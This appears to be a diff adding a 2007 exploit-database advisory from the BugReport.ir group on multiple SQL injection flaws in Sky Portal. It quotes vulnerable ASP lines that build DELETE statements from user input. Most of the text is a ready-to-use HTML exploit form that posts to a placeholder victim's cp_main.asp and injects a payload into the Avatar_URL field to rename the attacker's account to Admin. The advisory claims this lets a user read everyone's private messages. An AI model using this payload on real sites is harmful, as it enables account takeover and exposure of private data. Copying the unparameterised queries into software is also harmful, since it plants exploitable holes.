@@ -1,0 +1,78 @@
+########################## WwW.BugReport.ir ###########################################
+#
+#      BugReport Security Research & Penetration Testing Group
+#
+# Title: [Sky Portal] Multiple SQL Injection Vulnerabilities
+# Vendor: http://skyportal.net
+# Exploitation: Remote with browser
+# Fix Available: Patched In Last Version In Vendor
+#######################################################################################
+# Leaders : Shahin Ramezany & Sorush Dalili
+# Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi
+# Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com
+# Country: Iran
+# Contact : admin@bugreport.ir
+######################## Bug Description ###########################
+
+Description:
+--------------------
+A Lot Of Sql Injection Found And We Exploit One Of them
+A Registered User Can Change His/Her Name And Read All Other's Private Messages.
+
+Vulnerabilities:
+--------------------
++--> Multiple SQL Injection Vulnerabilities
+
+nc_top.asp Line 59 
+strDBNTFUserName = Mitoone injection bezane be functione line 60 iani isMbr() >>> test.htm  but !??! this function is very crazy!
+--------------------------
+user can delete all bookmarks
+inc_bookmarks.asp line 179
+delSQL = "DELETE FROM "& strTablePrefix & "BOOKMARKS WHERE BOOKMARK_ID = " & delBkmk(ib)
+
+this file use from cp_main.asp
+---------------------------
+
+inc_profile_functions.asp
+line 568,570,572,573
+
+---------------------------
+
+user can delete all SUBSCRIPTIONS>
+inc_SUBSCRIPTIONS.asp line 163
+delSQL = "DELETE FROM "& strTablePrefix & "SUBSCRIPTIONS WHERE SUBSCRIPTION_ID = " & delBkmk(ib)
+executeThis(delSQL)
+this file use from cp_main.asp
+
+
+-------------------------- Html Exploit ------------------------------
+
+<form action="http://[VICTIM URL]/cp_main.asp?mode=EditIt&cmd=9" method="post">
+Photo_URL: <input type="text" name="Photo_URL" value="" size="200"/>
+<br />
+Avatar_URL[injection goes here]: <input type="text" name="Avatar_URL" value="',M_Name='Admin',M_Username='Admin" />
+<br />
+LINK1[Also injection goes here]: <input type="text" name="LINK1" value="" />
+<br />
+LINK2[Also injection goes here]: <input type="text" name="LINK2" value="" />
+<br />
+Password: <input type="text" name="Password-d" value="YOU MUST ENTER YOUR HASHED PASSWORD HERE (For Ex: 123123 = defbfbd84d16387273dde914fd309c3b)" />
+<br />
+Email: <input type="text" name="Email" value="admin@bugreport.ir" />
+<br />
+Name: <input type="text" name="Name" value="Your Current Username" />
+<br />
+RECMAIL: <input type="text" name="RECMAIL" value="0" />
+<br />
+HideMail: <input type="text" name="HideMail" value="1" />
+<br />
+<br />
+<input type="submit" />
+</form>
+
+Credit:
+--------------------
+BugReport Security Research & Penetration Testing Group
+WwW.BugReport.ir
+
+# milw0rm.com [2007-11-20]
